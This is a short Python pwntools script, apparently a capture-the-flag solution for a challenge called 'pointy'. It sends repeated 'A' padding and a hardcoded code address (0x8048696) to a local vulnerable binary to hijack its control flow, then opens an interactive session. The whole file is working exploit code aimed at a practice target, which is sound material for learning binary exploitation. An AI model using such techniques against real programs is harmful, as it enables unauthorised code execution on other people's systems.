from pwn import *

path = "/problems/pointy_5_9e3dcfd0c67d6ad606d4d8b5d77379a4"
sock = process("{}/vuln".format(path), cwd=path)
#sock = process("./vuln")

payload =  b'A' * 0x7f
sock.recvline()
sock.send(payload)
sock.recvline()
sock.send(payload)
sock.recvline()
sock.send(payload)
sock.recvline()
sock.send(payload)
sock.recvline()
sock.sendline(str(0x8048696))

payload =  b'A' * 0x7f
sock.recvline()
sock.send(payload)
sock.recvline()
sock.send(payload)
sock.recvline()
sock.send(payload)
sock.recvline()
sock.send(payload)
sock.sendline("123")

sock.interactive()
